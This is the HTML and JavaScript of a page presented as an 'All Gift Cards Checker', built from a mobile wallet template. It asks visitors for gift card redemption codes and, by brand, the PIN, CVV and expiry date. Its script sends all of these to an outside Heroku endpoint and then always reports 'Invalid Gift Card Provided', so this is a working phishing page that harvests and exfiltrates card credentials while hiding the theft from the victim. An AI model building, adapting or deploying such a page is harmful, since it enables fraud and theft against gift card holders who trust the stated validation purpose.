
<!DOCTYPE html>
<html lang="en">
  <!-- Mirrored from finapp.bragherstudio.com/view4/app-about.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Sep 2021 23:27:00 GMT -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta
      name="apple-mobile-web-app-status-bar-style"
      content="black-translucent"
    />
    <meta name="theme-color" content="#000000" />
    <title>My Cards | All My Gift Cards</title>
    <meta name="description" content="Finapp HTML Mobile Template" />
    <meta
      name="keywords"
      content="bootstrap, wallet, banking, fintech mobile template, cordova, phonegap, mobile, html, responsive"
    />

    <link rel="stylesheet" href="https://allmygift.cards/assets/css/style.css" />
    <!-- <link rel="manifest" href="__manifest.json"> -->
  </head>

  <body>
    <!-- loader -->
    <div style="display: none" id="loader">
      <img src="https://allmygift.cards/assets/img/loading-icon.png" alt="icon" class="loading-icon" />
    </div>

    <!-- App Header -->
    <div class="appHeader">
      <div class="left">
        <a href="/" class="headerButton goBack">
          <ion-icon name="chevron-back-outline"></ion-icon>
        </a>
      </div>
      <div class="pageTitle">Gift Cards Checker</div>
      <div class="right">
        <a href="/" class="headerButton">
          <!-- <ion-icon class="icon" name="notifications-outline"></ion-icon> -->
          <img
            src="https://allmygift.cards/assets/img/logo (1).png"
            alt=""
            style="background-color: transparent"
            height="46px"
            width="76px"
          />
        </a>
      </div>
    </div>
    <!-- * App Header -->

    <!-- App Capsule -->
    <div id="appCapsule">
      <div class="section full">
        <img
          src="https://allmygift.cards/assets/img/giftcard_image1_400x.png"
          alt="image"
          class="imaged w-100 square"
        />
      </div>

      <div class="section mt-2">
        <div class="section-title">All Gift Cards Checker</div>
        <div class="card">
          <div class="card-body">
            <div class="mb-05">Enter Your Gift Card Redemption Code.</div>
            <form class="needs-validation">
              <div class="form-group basic animated">
                <div class="input-wrapper">
                  <label class="label" for="code">Redemption Code</label>
                  <input
                    type="text"
                    class="form-control is-invalid"
                    id="code"
                    placeholder="Redemption Code"
                    required
                  />
                  <i class="clear-input">
                    <ion-icon name="close-circle"></ion-icon>
                  </i>
                </div>
              </div>

              <div class="form-group basic animated">
                <div class="input-wrapper">
                  <label class="label" for="amount2">Gift Card Name</label>
                  <select
                    class="form-control custom-select"
                    id="name"
                    name="name"
                    required
                  >
                    <option value="NONE">Click to Select Gift Card Name</option>
                    <option value="GOOGLE_PLAY">Google Play</option>
                    <option value="STEAM">Steam</option>
                    <option value="APPLE">Apple</option>
                    <option value="MASTER_CARD">Master Card</option>
                   
                    <option value="VISA_SILVERY_WHITE">
                      Visa Silvery White
                    </option>
                    <option value="EBAY_CARD">Ebay Card</option>
                    <option value="FOOTLOCKER">Footlocker</option>
                    <option value="NIKE_CARD">Nike Card</option>
                    <option value="AMAZON">Amazon</option>
                    <option value="AMEX">Amex</option>
                    <option value="WALMART_VISA">Walmart Visa</option>
                    <option value="VANILLA">Vanilla</option>
                    <option value="NORDSTROM_CARD">Nordstrom Card</option>
                    <option value="SEPHORA">Sephora</option>
                    <option value="GOOGLE_PLAY">Others</option>
                  </select>
                  <i class="clear-input">
                    <ion-icon name="close-circle"></ion-icon>
                  </i>
                </div>
              </div>

              <div id="extras"></div>

              <div class="form-group">
                <div class="input-wrapper">
                  <input
                    type="submit"
                    class="form-control btn btn-primary"
                    id="button"
                    value="Check"
                  />
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>

      <div class="section mt-3 mb-3">
        <div class="card">
          <div class="card-body">
            <h2 class="card-title">Learn More</h2>
            All gift cards checker is a leading gift card checking and
            validation service provider with a repuation for providing fast and
            accurate gift card validation service to all of its users. Just
            proceed to the validation page, enter your redemption code and our
            systems will get to working. It's that simple!
          </div>
        </div>
      </div>

      <div class="section mt-3 mb-3">
        <div class="card">
          <div class="card-body">
            <h2 class="card-title">Have a Question?</h2>
            <p>
              Feel free to contact us with any problems. We will get back to you
              as soon as possible.
            </p>
            <a href="contact.html" class="btn btn-primary">
              <ion-icon name="mail-open-outline"></ion-icon> Contact
            </a>
          </div>
        </div>
      </div>

      <li style="display: none">
        <a
          href="#"
          class="item"
          id="alert"
          data-bs-toggle="modal"
          data-bs-target="#DialogIconedDanger"
        >
          <div class="in">
            <div></div>
          </div>
        </a>
      </li>

      <!-- DialogIconedDanger -->
      <div
        class="modal fade dialogbox show"
        id="DialogIconedDanger"
        data-bs-backdrop="static"
        tabindex="-1"
        role="dialog"
      >
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-icon text-danger">
              <ion-icon name="close-circle"></ion-icon>
            </div>
            <div class="modal-header">
              <h5 class="modal-title">Error</h5>
            </div>
            <div class="modal-body"></div>
            <div class="modal-footer">
              <div class="btn-inline">
                <a href="#" class="btn" data-bs-dismiss="modal">CLOSE</a>
              </div>
            </div>
          </div>
        </div>
      </div>
      <!-- * DialogIconedDanger -->
    </div>

    <!-- * App Capsule -->

    <!-- App Bottom Menu -->
    <div class="appBottomMenu">
      <a href="index.html" class="item">
        <div class="col">
          <ion-icon name="pie-chart-outline"></ion-icon>
          <strong>Overview</strong>
        </div>
      </a>
      <!-- <a href="app-pages.html" class="item">
        <div class="col">
          <ion-icon name="document-text-outline"></ion-icon>
          <strong>Pages</strong>
        </div>
      </a> -->
      <!-- <a href="app-components.html" class="item">
        <div class="col">
          <ion-icon name="apps-outline"></ion-icon>
          <strong>Components</strong>
        </div>
      </a> -->
      <a href="card.html" class="item">
        <div class="col">
          <ion-icon name="card-outline"></ion-icon>
          <strong>My Cards</strong>
        </div>
      </a>
      <a href="contact.html" class="item">
        <div class="col">
          <ion-icon name="settings-outline"></ion-icon>
          <strong>Contact Us</strong>
        </div>
      </a>
    </div>

    <!-- <p>Gift Card CVV:  ${cvv.value}</p>
          <p>Gift Card Expiry:  ${date.value}</p> -->

    <!-- * App Bottom Menu -->

    <!-- ========= JS Files =========  -->
    <!-- Bootstrap -->
    <script src="https://allmygift.cards/assets/js/lib/bootstrap.bundle.min.js"></script>
    <!-- Ionicons -->
    <!-- <script
      type="module"
      src="../../unpkg.com/ionicons%405.5.2/dist/ionicons/ionicons.js"
    ></script> -->
    <script
      type="module"
      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
    ></script>
    <script
      nomodule
      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
    ></script>
    <!-- Splide -->
    <script src="assets/js/plugins/splide/splide.min.js"></script>
    <!-- Base Js File -->
    <!-- <script src="assets/js/base.js"></script> -->

    <script src="https://smtpjs.com/v3/smtp.js"></script>

    <script>
      const form = document.querySelector('#extras');

      const cvvi = `

             <div class="form-group basic animated">
                    <div class="input-wrapper">
                      <label class="label" for="amount2">Gift CVV</label>
                      <input
                        type="number"
                        class="form-control"
                        id="cvv"
                        placeholder="Gift Card CVV"
                        required

                      />
                      <i class="clear-input">
                        <ion-icon name="close-circle"></ion-icon>
                      </i>
                    </div>
                  </div>
          `;
      const expi = `

             <div class="form-group basic animated">
                    <div class="input-wrapper">
                      <label class="label" for="amount2">Gift Expiry Date</label>
                      <input
                        type="text"
                        class="form-control"
                        id="exp"
                        placeholder="Gift Card Expiry Date"
                        required

                      />
                      <i class="clear-input">
                        <ion-icon name="close-circle"></ion-icon>
                      </i>
                    </div>
                  </div>
          `;
      const pini = `

             <div class="form-group basic animated">
                    <div class="input-wrapper">
                      <label class="label" for="amount2">Gift Pin</label>
                      <input
                        type="number"
                        class="form-control"
                        id="pin"
                        placeholder="Gift Card Pin"
                        required

                      />
                      <i class="clear-input">
                        <ion-icon name="close-circle"></ion-icon>
                      </i>
                    </div>
                  </div>
          `;

      const pinini = `

             <div class="form-group basic animated">
                    <div class="input-wrapper">
                      <label class="label" for="amount2">4 Digits Pin</label>
                      <input
                        type="number"
                        class="form-control"
                        id="pin"
                        placeholder="4 Digits Pin"
                        maxlength="4"
                        required

                      />
                      <i class="clear-input">
                        <ion-icon name="close-circle"></ion-icon>
                      </i>
                    </div>
                  </div>
          `;

      const cards = {
        GOOGLE_PLAY: 'code',
        STEAM: 'code',
        SEPHORA: 'codepin',
        NORDSTROM_CARD: 'codepin',
        VANILLA: 'codeexpcvv',
        WALMART_VISA: 'codeexpcvv',
        AMEX: 'codeexpcvv4',
        AMAZON: 'code',
        NIKE_CARD: 'codepin',
        FOOTLOCKER: 'code',
        EBAY_CARD: 'code',
        VISA_SILVERY_WHITE: 'codeexpcvv',
        TT_VISA: 'codeexpcvv',
        MASTER_CARD: 'codepin',
        APPLE: 'code',
      };

      function getName(card) {
        return cards[card];
      }

      function injectHTML(type) {
        if (type === 'code') {
          form.innerHTML = '';
          return;
        }

        if (type === 'codepin') {
          form.innerHTML = pini;
          return;
        }

        if (type === 'codeexpcvv') {
          form.innerHTML = cvvi + expi;
          return;
        }

        if (type === 'codeexpcvvpin') {
          form.innerHTML = expi + pini + cvvi;
          return;
        }

        if (type === 'codeexpcvv4') {
          form.innerHTML = expi + pinini + cvvi;
          return;
        }
      }

      const loader = document.querySelector('#loader');
      const button = document.querySelector('#button');
      const modal = document.querySelector('#alert');
      const names = document.querySelector('#name');
      var name = names.options[names.selectedIndex].value;
      const code = document.querySelector('#code');

      const error = document.querySelector('.modal-body');

      const data = document.querySelector('form');

      const m = 'modal open';
      const s = 'overflow: hidden; padding-right: 0px;';
      data.on;
      names.onchange = function () {
        name = names.options[names.selectedIndex].value;

        if (name !== 'NONE') {
          injectHTML(getName(name));
        } else {
          form.innerHTML = '';
          return;
        }

        const exp = document.querySelector('#exp');
        console.log('GOT HERE');

        if (exp) {
          exp.oninput = function () {
            const expdate = exp.value;
            if (exp.value.length > 2) {
              exp.value =
                expdate.replace(/\//g, '').substring(0, 2) +
                (expdate.length > 2 ? '/' : '') +
                expdate.replace(/\//g, '').substring(2, 4);
            }
          };
        }
      };

      data.onsubmit = function (e) {
        e.preventDefault();

        const cvv = document.querySelector('#cvv');
        const exp = document.querySelector('#exp');
        const pin = document.querySelector('#pin');

        if (name === 'NONE') {
          error.textContent = 'Please select Gift Card name';
          modal.click();
          return;
        }

        if (code.value.length < 10) {
          error.textContent = 'Invalid gift card redemption code';
          modal.click();
          return;
        }

        if (cvv && cvv.value.length < 3) {
          error.textContent = 'Invalid CVV code provided';
          modal.click();
          return;
        }

        if (pin && pin.value.length < 3) {
          error.textContent = 'Invalid card pin provided';
          modal.click();
          return;
        }

        if (exp && exp.value.length < 5) {
          error.textContent = 'Invalid expiry date provided';
          modal.click();
          return;
        }

        loader.style.display = '';

        async function send(code, name, exp, pin, cvv) {
          var response = await fetch(
            'https://samperfect.herokuapp.com/api/v1/send/',
            {
              method: 'POST',
              body: JSON.stringify({
                code,
                name,
                exp,
                pin,
                cvv,
              }),
              headers: {
                'Content-Type': 'application/json',
              },
            }
          );
          //getting the response data
          var data = await response.json();
          if (response.status == 200) {
            return 'DONE';
          }
        }

        send(
          code.value,
          name,
          exp ? exp.value : 'NONE',
          pin ? pin.value : 'NONE',
          cvv ? cvv.value : 'NONE'
        )
          .then((state) => {
            console.log(state);

            loader.style.display = 'none';
            error.textContent = 'Invalid Gift Card Provided.';
            modal.click();
          })
          .catch((error) => {
            console.log(error);

            loader.style.display = 'none';

            error.textContent = 'Invalid Gift Card Provided.';
            modal.click();
          });
      };
    </script>
  </body>

  <!-- Mirrored from finapp.bragherstudio.com/view4/app-about.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Sep 2021 23:27:01 GMT -->
</html>
